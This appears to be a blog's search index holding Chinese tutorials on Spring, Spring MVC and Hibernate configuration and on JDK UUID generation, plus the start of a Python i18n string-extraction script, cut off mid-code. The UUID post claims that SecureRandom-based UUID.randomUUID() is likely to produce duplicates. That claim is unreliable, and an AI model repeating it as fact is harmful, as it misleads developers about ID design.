<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[整合SSH框架之基础搭建]]></title>
    <url>%2F21f173fb%2F</url>
    <content type="text"><![CDATA[SpringBoot把各种框架的整合用约定俗成的模板进行了默认配置，简化了各种框架的整合过程。在方便开发的同时也屏蔽了一些基础细节，在微服务大行其道的今天，Spring Boot 和 Spring Cloud 这些框架在开发时无疑是目前的首选，但是却不利于学习各个框架的基础，对于后端的初学者来说应当回过头来把每个框架的基础配置和使用都系统的学习一遍。强迫症的我决定要重新开始用传统的Spring+SpringMVC+Hibernate进行整合，这些框架都尽量采用目前最新的版本，后续对其他框架的整合配置以及实现进行迭代学习。 基本概念在Java后端开发中，使用的大多数框架都采用SSH、或者SSM，即使采用Spring Boot这样的框架也不例外，因为它本身也属于Spring家族，方便了各个框架的集成，开箱即用。 SpringSpring是一个Java开发框架，用来简化对象依赖以及生命周期管理。Spring的核心是IOC（控制反转）和AOP（面向切面编程），IOC容器可以创建并管理对象的生命周期，控制反转就是将对象的创建以及生命周期交给Spring 的IOC容器来控制，IOC从另外一个角度来看也叫做依赖注入，利用这一特性可以降低类之间的耦合度，并且通过Spring提供的AOP，可以很方便的定义自己的规则，将切面应用于某个方法上进行方法增强，比如日志输出，事物控制等。Spring的配置可以采用Java类的方式，但是为了降低与程序代码的依赖，一般使用xml外部配置文件来配置Spring。 Spring MVCSpring MVC 是用于web端的Servlet开发框架，用来简化web端编程。在Spring MVC出现之前，Java的web端编程一般采用服务器容器提供的原生API，比如Tomcat等主流服务器都支持的Servlet规范所提供的各种API接口，开发者通过HttpServletRequest与HttpServletResponse接口提供的方法来接收处理用户的请求与响应请求。当一个项目很庞大且复杂的时候，一般会对Servlet提供的这些接口进行统一封装，比如请求方式的定义，请求体参数的获取，请求响应对象数据等。Spring MVC屏蔽与业务无关的底层代码，帮助开发者做了Servlet的封装，并且依赖Spring的强大特性，开发者只需要将请求配置给Spring MVC提供的DispatcherServlet，就可以在自己的业务逻辑中使用Spring 和SpringMVC带来的强大功能 HibernateHibernate是一个ORM框架，用来简化数据库操作。在Hibernate出现之前，Java操作数据库一般采用JDBC提供的API直接去操作，需要自己编写大量的SQL，容易一不小心就直接拼接上一个非法的参数变量导致SQL注入，而且每次将结果重新赋值给Java对象显得非常繁琐，没有通用性。所以在项目中一般会对JDBC进行再次封装，采用Java反射等技术实现了一个ORM的功能，这种功能和目前主流的Hibernate与Mybatis类似，都对JDBC的数据库操作进行了封装。但是Hibernate更为强大。众所周知，关系型数据库虽然将现实事物进行了抽象，但是关系型数据库的传统操作还是使用SQL，SQL本身是面向过程的，人类去编写很复杂的一串SQL时如果没有足够的经验很容易会写出BUG，比如多表关联查询时可能要写很长的SQL，并且整个业务系统可能有很多地方有类似的查询，如果全部用SQL编写可能很耗时，所以出现了关系实体映射的ORM框架。Hibernate对SQL进行了抽象，开发人员直接操作Java对象就可以操作数据库，最终的SQL由Hibernate翻译生成，对象操作更不容易出错且更加直观。除此之外Hibernate还做了很多封装，比如数据库不同级别的缓存策略，事物策略等，框架本身是为了简化开发成本。 创建项目开发工具和框架版本 操作系统: MacOS Mojave 10.14 JDK版本: 1.8.0_192 IntelliJ IDEA版本: Ultimate 2018.2.5 Maven版本: 3.3.9 Spring 5.1.1.RELEASE Spring MVC 5.1.1.RELEASE Hibernate 5.3.7.Final 无论采用IDEA还是Eclipse，在使用Maven构建项目时，勾选Create from archetype，选择从模板创建并找到 org.apache.maven.archetypes:maven-archetype-webapp这个模板底下的maven-archetype-webapp:RELEASE，用来快速创建一个Maven构建的Java Web工程。有关Spring的相关文档可查阅官网https://docs.spring.io/spring/docs/5.1.1.RELEASE/spring-framework-reference/index.html 引入依赖pom.xml12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;!-- 添加 Spring MVC 依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;5.1.1.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 添加 Spring ORM 依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-orm&lt;/artifactId&gt; &lt;version&gt;5.1.1.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 添加 Hibernate 依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.hibernate&lt;/groupId&gt; &lt;artifactId&gt;hibernate-agroal&lt;/artifactId&gt; &lt;version&gt;5.3.7.Final&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;/dependency&gt; &lt;!-- 添加 C3P0 数据库连接池依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.mchange&lt;/groupId&gt; &lt;artifactId&gt;c3p0&lt;/artifactId&gt; &lt;version&gt;0.9.5.2&lt;/version&gt; &lt;/dependency&gt; &lt;!--添加 MySQL 连接驱动依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.13&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 添加 jackson-core 依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-core&lt;/artifactId&gt; &lt;version&gt;2.9.7&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 添加 jackson-databind 依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.9.7&lt;/version&gt; &lt;/dependency&gt; 配置web.xmlweb.xml123456789101112131415161718192021222324252627282930313233&lt;web-app&gt; &lt;display-name&gt;SSH 框架整合&lt;/display-name&gt; &lt;!-- 配置Spring的监听器，Spring 容器启动时默认会加载 WEB-INF 目录下的 applicationContext.xml 文件 --&gt; &lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;!--当 WEB-INF 目录下的 applicationContext.xml 文件不存在时，一定要指定自定义名称的配置文件--&gt; &lt;!-- 定义自定义名称的 Spring 上下文配置文件--&gt; &lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;WEB-INF/app-context.xml&lt;/param-value&gt; &lt;/context-param&gt; &lt;!--配置 Spring MVC 的 servlet 拦截器--&gt; &lt;servlet&gt; &lt;servlet-name&gt;app&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;!--配置初始化时要加载的自定义配置文件，如果不配置则默认为 WEB-INF 目录下的 app-servlet.xml 文件--&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;WEB-INF/app-webmvc.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;/servlet&gt; &lt;!-- 配置servlet映射所匹配的url --&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;app&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;&lt;/web-app&gt; 配置 SpringWEB-INF/app-context.xml1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tx="http://www.springframework.org/schema/tx" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd"&gt; &lt;description&gt;Spring 配置&lt;/description&gt; &lt;!-- 加载外部配置文件 --&gt; &lt;bean class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer"&gt; &lt;property name="locations"&gt; &lt;list&gt; &lt;!-- 如果有多个配置文件可以用多个value标签进行配置 --&gt; &lt;value&gt;classpath:db.properties&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; &lt;/bean&gt; &lt;!-- 配置数据源 dataSource --&gt; &lt;bean id="dataSource" class="com.mchange.v2.c3p0.ComboPooledDataSource"&gt; &lt;!-- 配置连接池基础信息：连接驱动、连接地址、用户名、密码 --&gt; &lt;property name="driverClass" value="$&#123;jdbc.driverClass&#125;"/&gt; &lt;property name="jdbcUrl" value="$&#123;jdbc.url&#125;"/&gt; &lt;property name="user" value="$&#123;jdbc.user&#125;"/&gt; &lt;property name="password" value="$&#123;jdbc.password&#125;"/&gt; &lt;!-- 初始化连接池连接数大小，默认值为3 --&gt; &lt;property name="initialPoolSize" value="$&#123;initialPoolSize&#125;"/&gt; &lt;!-- 最大空闲时间，为0则永不丢弃，默认值为0 --&gt; &lt;property name="maxIdleTime" value="$&#123;maxIdleTime&#125;"/&gt; &lt;!-- 连接池的最大连接数，默认最大值为15 --&gt; &lt;property name="maxPoolSize" value="$&#123;maxPoolSize&#125;"/&gt; &lt;!-- 连接池中保持的最小连接数，默认值为3 --&gt; &lt;property name="minPoolSize" value="$&#123;minPoolSize&#125;"/&gt; &lt;!-- 更多配置以及默认值可查看c3p0依赖库中的 com.mchange.v2.c3p0.impl.C3P0Defaults类 --&gt; &lt;/bean&gt; &lt;!-- 配置会话工厂 SessionFactory --&gt; &lt;bean id="sessionFactory" class="org.springframework.orm.hibernate5.LocalSessionFactoryBean"&gt; &lt;!--配置数据源--&gt; &lt;property name="dataSource" ref="dataSource"/&gt; &lt;!--配置 Hibernate属性--&gt; &lt;property name="hibernateProperties"&gt; &lt;props&gt; &lt;!-- hibernate 方言 --&gt; &lt;prop key="hibernate.dialect"&gt;$&#123;hibernate.dialect&#125;&lt;/prop&gt; &lt;prop key="hibernate.show_sql"&gt;$&#123;hibernate.show_sql&#125;&lt;/prop&gt; &lt;prop key="hibernate.format_sql"&gt;$&#123;hibernate.format_sql&#125;&lt;/prop&gt; &lt;prop key="hibernate.hbm2ddl.auto"&gt;$&#123;hibernate.hbm2ddl.auto&#125;&lt;/prop&gt; &lt;/props&gt; &lt;/property&gt; &lt;!-- 配置要扫描的包路径 --&gt; &lt;property name="packagesToScan" value="com.lanshiqin.*.entity"/&gt; &lt;/bean&gt; &lt;!-- 配置事物管理 transactionManager --&gt; &lt;bean id="transactionManager" class="org.springframework.orm.hibernate5.HibernateTransactionManager"&gt; &lt;!-- 配置 SessionFactory --&gt; &lt;property name="sessionFactory" ref="sessionFactory"/&gt; &lt;/bean&gt; &lt;!-- 配置事务，使事务注解生效 默认属性值 transaction-manager="transactionManager"，因为上面配置了预定的默认名称，故此处可省略 --&gt; &lt;tx:annotation-driven/&gt;&lt;/beans&gt; 配置 Spring MVCWEB-INF/app-webmvc.xml1234567891011121314151617181920212223242526272829303132&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xmlns:mvc="http://www.springframework.org/schema/mvc" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd"&gt; &lt;description&gt;Spring MVC 配置&lt;/description&gt; &lt;!-- 配置扫描注解的目录 --&gt; &lt;context:component-scan base-package="com.lanshiqin"/&gt; &lt;!-- 配置内部资源分配器，为模型视图名称添加前置路径和后缀名称 --&gt; &lt;bean class="org.springframework.web.servlet.view.InternalResourceViewResolver"&gt; &lt;property name="prefix" value="/templates/"/&gt; &lt;property name="suffix" value=".jsp"/&gt; &lt;/bean&gt; &lt;!-- 配置默认的servlet，处理程序将所有的请求转发到默认处理器，处理静态资源 --&gt; &lt;mvc:default-servlet-handler/&gt; &lt;!-- 配置消息视图转换 --&gt; &lt;mvc:annotation-driven&gt; &lt;mvc:message-converters&gt; &lt;bean class="org.springframework.http.converter.StringHttpMessageConverter"/&gt; &lt;bean class="org.springframework.http.converter.json.MappingJackson2HttpMessageConverter"/&gt; &lt;/mvc:message-converters&gt; &lt;/mvc:annotation-driven&gt;&lt;/beans&gt; 配置Hibernate在Spring的配置文件app-context.xml中其实已经配置了Hibernate的一些实例属性，应用程序的连接池以及Hibernate的SessionFactory和事务管理等，这里是将xml中的配置提取到外部文件，方便后期对这些配置参数的修改和调整。resources/db.properties1234567891011121314151617181920212223242526# 数据库配置jdbc.driverClass=com.mysql.cj.jdbc.Driverjdbc.url=jdbc:mysql://localhost:3306/sshjdbc.user=xxxxjdbc.password=xxxxxx# 初始化连接池连接数大小initialPoolSize=3# 最大空闲时间，超值丢弃连接maxIdleTime=60# 连接池的最大连接数maxPoolSize=50# 连接池中保持的最小连接数minPoolSize=3# hibernate 方言hibernate.dialect=org.hibernate.dialect.MySQL8Dialecthibernate.show_sql=truehibernate.format_sql=truehibernate.hbm2ddl.auto=update 常见问题pom.xml 中的依赖在pom.xml中有关Spring的依赖中，为何只引入了Spring MVC 和 Spring ORM 的依赖？因为 Spring MVC 依赖于 Spring Core、Spring Bean、Spring Context 等其他基础模块，所以引入一个 Spring MVC 依赖，maven会将其关联的依赖一起引入。由上图可知，Spring模块关系顶层分为两大类，一个是用于web开发的Spring MVC，另一类与数据相关的，底层的大部分基础模块都是共同需要的，开发者可以根据自己需要引入相关的模块。 为何要单独引入fasterxml的jackson的core和databading依赖，不添加会有什么问题？因为后端接口开发目前基本都有需要输出Json格式的数据场景，所以需要在Spring中配置消息视图转换器，Spring默认没有Json序列化的实现，所以如果不添加json的相关依赖库，将无法处理json转换相关的功能，比如在使用 @ResponseBody注解时不会被解析，如果配置了视图解析器为json，那么会因为找不到json依赖库在容器启动时抛出异常。 web.xml 的配置listener标签中配置的Spring的ContextLoaderListener有什么作用，为什么要配置这个参数？123&lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;&lt;/listener&gt; ContextLoaderListener是Spring的上下文加载监听器，开发者通过该监听器可以实现一些自定义功能。另外很重要的一点是该配置会使Spring 容器启动时默认加载 WEB-INF 目录下的 applicationContext.xml 文件，如果不想按照约定创建这个文件，则必须要自己指定配置文件。有关如何指定配置文件，请继续往下看。 为何要配置contextConfigLocation这个参数1234&lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;WEB-INF/app-context.xml&lt;/param-value&gt;&lt;/context-param&gt; 因为在listener标签中配置了ContextLoaderListener，所以Spring 容器启动时默认会加载 WEB-INF 目录下的 applicationContext.xml文件， 由于 WEB-INF 目录下 没有 applicationContext.xml 这个配置文件，所以容器启动时会抛出IO异常。java.io.FileNotFoundException: Could not open ServletContext resource [/WEB-INF/applicationContext.xml]，要避免这个问题，需要在 WEB-INF 目录下建立 applicationContext.xml文件。如果开发者不想创建 applicationContext.xml文件，就必须通过contextConfigLocation参数指定自定义配置文件。 为何在&lt;servlet&gt;标签中配置&lt;init-param&gt;初始化参数并且指定contextConfigLocation配置？这个和上面的配置不是重复了吗？123456789&lt;servlet&gt; &lt;servlet-name&gt;app&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;WEB-INF/app-webmvc.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt; 因为这个servlet配置的是Spring MVC 的DispatcherServlet，实例创建时默认会加载/WEB-INF/app-servlet.xml,如果开发者在对应目录下创建了该文件，则可以不需要配置这个初始化参数。如果不创建/WEB-INF/app-servlet.xml，则会抛出IO异常java.io.FileNotFoundException: Could not open ServletContext resource [/WEB-INF/app-servlet.xml]。如果不想创建/WEB-INF/app-servlet.xml,就必须在DispatcherServlet所在的servlet标签中配置自定义文件 spring配置文件问题InternalResourceViewResolver12345&lt;!-- 配置内部资源分配器，为模型视图名称添加前置路径和后缀名称 --&gt;&lt;bean class="org.springframework.web.servlet.view.InternalResourceViewResolver"&gt; &lt;property name="prefix" value="/templates/"/&gt; &lt;property name="suffix" value=".jsp"/&gt;&lt;/bean&gt; 配置内部资源分配器。可以通过属性指定web工程所在的模板视图的路径前缀和模板文件名后缀，即通过Controller重定向到的页面路径为/templates/+ 模板文件名 + .jsp例如123456@RequestMapping("/hello")public ModelAndView index(ModelAndView modelAndView)&#123; modelAndView.addObject("name","蓝士钦"); modelAndView.setViewName("index"); return modelAndView;&#125; 该方法通过modelAndView的addObject向页面传递了参数名name和对应的参数值，并且通过setViewName方法指定模板文件名，所以访问该方法最终会被转发到 /templates/index.jsp 这个页面在 /templates/ 目录下 创建 index.jsp，可以获取到方法传过来的值index.jsp123456789&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;SSH&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;Hello $&#123;name&#125;&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt; default-servlet-handler1&lt;mvc:default-servlet-handler/&gt; 该配置用来指定DispatcherServlet为默认的servlet，处理程序将所有的请求转发到默认处理器，一定要配置该处理程序，才能使内部资源分配器InternalResourceViewResolver的配置生效。如果没有这个配置，开发者视图访问控制器所转发的页面时会抛出异常信息 org.springframework.web.servlet.DispatcherServlet.noHandlerFound No mapping for GET / …default-servlet-handler 的源码中说明如下： Configures a handler for serving static resources by forwarding to the Servlet container’s default Servlet.Use of this handler allows using a “/“ mapping with the DispatcherServlet while still utilizing the Servletcontainer to serve static resources.This handler will forward all requests to the default Servlet. Therefore it is important that it remains lastin the order of all other URL HandlerMappings. That will be the case if you use the “annotation-driven” elementor alternatively if you are setting up your customized HandlerMapping instance be sure to set its “order”property to a value lower than that of the DefaultServletHttpRequestHandler, which is Integer.MAX_VALUE. message-converters我们经常会看到一个Controller中的方法上面标注了一个@ResponseBody注解，特别是经常使用 Spring Boot 的同学会发现加上这个注解之后通过浏览器访问接口会返回Json数据，其实这是 Spring Boot 默认替开发者配置了消息转换器。 @ResponseBody可以输出Json格式的数据，也可以输出XML格式的数据，具体输出什么取决于对消息转换器的配置。比如下面这段代码12345678@GetMapping("info")@ResponseBodypublic User info()&#123; User user = new User(); user.setUserName("蓝士钦"); user.setPassWord("xxx"); return user;&#125; 在Spring Boot 中访问该接口会输出对象的json数据1234&#123; "userName": "蓝士钦", "passWord": "123"&#125; 但是如果是非Spring Boot 工程，比如自己用 Spring MVC 整合的框架中，如果没有对消息转换器进行配置，那么 Spring MVC 默认将不会对@ResponseBody注解进行解析，最终会出现404 - Not Found 所以我们需要配置消息转换器1234567&lt;!-- 配置消息视图转换 --&gt;&lt;mvc:annotation-driven&gt; &lt;mvc:message-converters&gt; &lt;bean class="org.springframework.http.converter.StringHttpMessageConverter"/&gt; &lt;bean class="org.springframework.http.converter.json.MappingJackson2HttpMessageConverter"/&gt; &lt;/mvc:message-converters&gt;&lt;/mvc:annotation-driven&gt; 由于上面配置了Json信息映射，而Spring本身并没有实现json处理，如果没有添加json相关的依赖库，那么将会在启动过程中出现org.springframework.web.servlet.FrameworkServlet.initServletBean Context initialization failed，并且输出 RequestMappingHandlerAdapter这个Bean创建失败的信息。 所以一定要记得在pom.xml中添加json处理的依赖库12345678910111213&lt;!-- 添加 jackson-core 依赖 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-core&lt;/artifactId&gt; &lt;version&gt;2.9.7&lt;/version&gt;&lt;/dependency&gt;&lt;!-- 添加 jackson-databind 依赖 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.9.7&lt;/version&gt;&lt;/dependency&gt; 项目框架将持续集成和更新，GitHub：https://github.com/lanshiqin/ssh-framework]]></content>
  </entry>
  <entry>
    <title><![CDATA[正确的使用UUID]]></title>
    <url>%2Fcfcd1d83%2F</url>
    <content type="text"><![CDATA[项目中出现多次取到重复UUID的情况，导致使用UUID作为数据库主键的记录因为存在相同id插入失败。造成这个问题的根本原因是因为使用了错误的UUID生成策略。发现代码中使用 UUID.randomUUID()这个方法来取得UUID，用这个方法取到的UUID是有可能重复的。因为这个取UUID的策略是随机数策略，目前计算机中产生的随机数都是伪随机数。 特意查阅了一下网上关于UUID的示例文章，很多都是介绍了一堆UUID的概念：根据全局的机器识别码、网卡MAC地址和时间戳来生成UUID，最后使用方法的时候很不负责任的用了一个UUID.randomUUID()方法来取UUID，这样取到的UUID根本就不包含网卡MAC地址和时间戳这些信息，这种方式生成的UUID是随机数，是有可能重复的。 常见的使用方式网上很多文章里，获取UUID的方式:1UUID.randomUUID().toString() 以下是UUID类的源码，randomUUID方法的实现 randomUUID()源码12345678910111213141516171819/** * Static factory to retrieve a type 4 (pseudo randomly generated) UUID. * * The &#123;@code UUID&#125; is generated using a cryptographically strong pseudo * random number generator. * * @return A randomly generated &#123;@code UUID&#125; */public static UUID randomUUID() &#123; SecureRandom ng = Holder.numberGenerator; byte[] randomBytes = new byte[16]; ng.nextBytes(randomBytes); randomBytes[6] &amp;= 0x0f; /* clear version */ randomBytes[6] |= 0x40; /* set to version 4 */ randomBytes[8] &amp;= 0x3f; /* clear variant */ randomBytes[8] |= 0x80; /* set to IETF variant */ return new UUID(randomBytes);&#125; 通过源码和注释可以知道randomUUID这个静态方法使用了随机数的策略来生成UUID。randomUUID方法内使用SecureRandom类提供了强加密的随机数生成。在SecureRandom类的源码注释中提供了一个网址http://www.ietf.org/rfc/rfc1750.txt 提出了关于强加密生成随机数的实现考量和具体细节。目前分析的是JDK1.8的源码，相比之前版本做了一些微小的改进，有关SecureRandom随机数的生成方式的具体实现可以自行阅读源码。randomUUID方法最后将生成好的16位随机数字节数组传给UUID构造函数UUID(byte[] data)进行有效位计算 UUID(byte[] data)源码12345678910111213141516// Constructors and Factories/* * Private constructor which uses a byte array to construct the new UUID. */private UUID(byte[] data) &#123; long msb = 0; long lsb = 0; assert data.length == 16 : "data must be 16 bytes in length"; for (int i=0; i&lt;8; i++) msb = (msb &lt;&lt; 8) | (data[i] &amp; 0xff); for (int i=8; i&lt;16; i++) lsb = (lsb &lt;&lt; 8) | (data[i] &amp; 0xff); this.mostSigBits = msb; this.leastSigBits = lsb;&#125; UUID(byte[] data)构造函数根据传入的字节数组进行有效位计算，将前8个字节赋值给高64位mostSigBits，后8个字节赋值给低64位leastsigbits，组合成完整的UUID长度为(64+64)128位。 可以发现通过randomUUID方式获取UUID的整个过程就是对取到的随机数进行计算，根本没有网上某些文章所说的根据网卡MAC地址和时间戳进行生成。通过UUID.randomUUID().toString()生成的UUID格式如下11f1fa8ea-06fe-4bdf-a0cb-e0fe7baca34c 之所以输出这种格式，是因为调用了UUID中的toString方法，该方法通过-符号将UUID最终的值分为5段组合，前3段分别为：高64位右移32取8位16进制字符串拼接-，高64位右移16位取4位16进制字符串拼接-,高64位取4位16进制字符串拼接-，后2段分别是：低64位右移48取4位16进制字符串拼接-，低64位取12位16进制字符串。 UUID toString()1234567public String toString() &#123; return (digits(mostSigBits &gt;&gt; 32, 8) + "-" + digits(mostSigBits &gt;&gt; 16, 4) + "-" + digits(mostSigBits, 4) + "-" + digits(leastSigBits &gt;&gt; 48, 4) + "-" + digits(leastSigBits, 12));&#125; 最终整个完整的值长度为8-4-4-4-12，去掉-符号，就是网上常说的32位16进制字符串。很多旧的项目工程中也很习惯性的采用UUID.randomUUID().toString()这种方式去获取UUID，通过UUID类的静态方法取值确实写起来很方便，但是如果应用在分布式集群等需要作为记录凭据的唯一性时就有可能出现问题，因为randomUUID()方法取到的UUID无法保证全局唯一性。 UUID的定义UUID全称:Universally Unique Identifier，通用唯一识别码。在JDK中UUID有4种不同的策略实现 JDK中的UUID策略实现通过阅读UUID源代码，并且从UUID类上的注释可知1234* &lt;p&gt; The version field holds a value that describes the type of this &#123;@code* UUID&#125;. There are four different basic types of UUIDs: time-based, DCE* security, name-based, and randomly generated UUIDs. These types have a* version value of 1, 2, 3 and 4, respectively. 在JDK的UUID类中有四种不同的实现类型：基于时间、基于DCE安全、基于名字，基于随机数。文章开头提到的就是第4种，基于随机数的类型。这种生成方式在大一点的分布式环境下取到重复值的概率是很大的。下面来具体分析一下目前JDK中4中不同的UUID生成方式区别 UUID1 基于时间戳12 UUID2 基于DCE安全12 UUID3 基于名字12UUID uuid3 = UUID.nameUUIDFromBytes("蓝士钦".getBytes());System.out.println(uuid3.toString()); nameUUIDFromBytes源码如下：1234567891011121314151617181920212223/** * Static factory to retrieve a type 3 (name based) &#123;@code UUID&#125; based on * the specified byte array. * * @param name * A byte array to be used to construct a &#123;@code UUID&#125; * * @return A &#123;@code UUID&#125; generated from the specified array */public static UUID nameUUIDFromBytes(byte[] name) &#123; MessageDigest md; try &#123; md = MessageDigest.getInstance("MD5"); &#125; catch (NoSuchAlgorithmException nsae) &#123; throw new InternalError("MD5 not supported", nsae); &#125; byte[] md5Bytes = md.digest(name); md5Bytes[6] &amp;= 0x0f; /* clear version */ md5Bytes[6] |= 0x30; /* set to version 3 */ md5Bytes[8] &amp;= 0x3f; /* clear variant */ md5Bytes[8] |= 0x80; /* set to IETF variant */ return new UUID(md5Bytes);&#125; 可以看到这种策略是将传入的名字数组进行MD5计算得到一个MD5数组值，然后再将得到的值进行高低位计算得到UUID。想要生成的ID不同，传入的name就必须不同。 两段不同内容的字符串，可能会产生相同的MD5值，俗称的MD5碰撞。所以这里传入的name值越长，内容越多，产生碰撞的概率越小。 UUID4 基于随机数12]]></content>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[避免无用的重复劳动力]]></title>
    <url>%2F7c398525%2F</url>
    <content type="text"><![CDATA[遇到这样一个需求，需要将旧系统中的几十个页面做国际化。由于之前是写死中文，所以需要耗费大量的工作将系统中的中文全部提取出来做翻译工作。人工查找不仅费时费力，而且还有可能出现遗漏。站在开发者的角度思考问题，我们应该把抽象的问题具体化，并且将可行的方案用程序实现，将重复工作交给计算机去做，下次遇到同样的问题就可以直接使用上次的工具，避免重复无用的劳动力。 原始需求分析系统需要做国际化，涉及的工程模块比较多，需要将每个html页面中写死的中文修改成国际化支持。要找出所有页面的中文，将中文罗列出来交给专业人士进行一一对应的翻译，翻译后要逐个替换为国际化支持的表达式，其中的键名在翻译前就需要确定。主要的体力劳动在于找出所有的中文和替换掉所有的中文为表达式的操作。 问题具体化目前系统页面的写法：中文内容写死在html中1234567891011121314151617&lt;html&gt; &lt;head&gt; &lt;title&gt;vue-demo&lt;/title&gt; &lt;script src="vue.min.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- Vue示例 --&gt; &lt;div id="app"&gt; &lt;p&gt;中文内容&lt;/p&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; new Vue(&#123; el: '#app' &#125;); &lt;/script&gt;&lt;/html&gt; 使用VueI18n国际化的写法：不同语种对应的词使用相同的键名，页面根据键名取值，值内容由语言环境决定123456789101112131415161718192021222324252627282930313233343536373839&lt;html&gt; &lt;head&gt; &lt;title&gt;vue-i18n-demo&lt;/title&gt; &lt;script src="vue.min.js"&gt;&lt;/script&gt; &lt;script src="vue-i18n.min.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="app"&gt; &lt;!-- 根据键名输出值 --&gt; &lt;p&gt;&#123;&#123; $t("message.title") &#125;&#125;&lt;/p&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; // 消息定义，一般将不同语种分别放置到不同的文件中 const messages = &#123; en: &#123; message: &#123; title: 'English Content' &#125; &#125;, cn: &#123; message: &#123; title: '中文内容' &#125; &#125; &#125;; // VueI18n 实例，设置当前语言环境和消息对象 const i18n = new VueI18n(&#123; locale: 'en', messages: messages, &#125;); new Vue(&#123; el: '#app', i18n: i18n &#125;); &lt;/script&gt;&lt;/html&gt; 在实际使用中，我们一般将不同的语种放置到不同的文件中，每个语种都可以请相关专业的人进行翻译。系统使用时再跟进语言环境加载不同的语言包文件，这点和Android App等移动开发类似，也是采用这种方案。 实现方案1.将工程下所有的html页面中的所有中文提取到一个文件中（提取内容要忽略掉代码中的注释文件）2.将提取出来的中文做翻译工作（可以交给专业人士翻译），每个语种对应生成一个js语言变量文件。 1234const en = &#123; 简体中文标题: 'English Title', 简体中文内容: 'English Content',&#125; 其中js变量文件中自动生成好默认的键,根据源代码中开发者写死的中文作为键的好处是翻译人员可以明确要翻译的内容，翻译后把对应的值赋值上即可。程序中也以当前开发者之前所写的语言作为键，省去人工比对翻译键值对的操作。 3.将html的中文替换为VueI18n模板表达式，变量值为语言文件中对应的键 做完上述工作后就可以根据语言环境的切换自动加载不同的语言文件，页面上的文字值显示的为对应js语言文件中的值。 编码实现第一步：提取中文到指定文件 TextUtils.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import osimport re__author__ = '蓝士钦'# 获取指定目录下指定后缀的文件全路径名，返回数组def get_file_path_list(path, find_suffix): files = os.listdir(path) # 得到文件夹下的所有文件名称 s = [] for file in files: # 遍历文件夹 if os.path.splitext(file)[1] == find_suffix: s.append(path + "/" + file) return s# 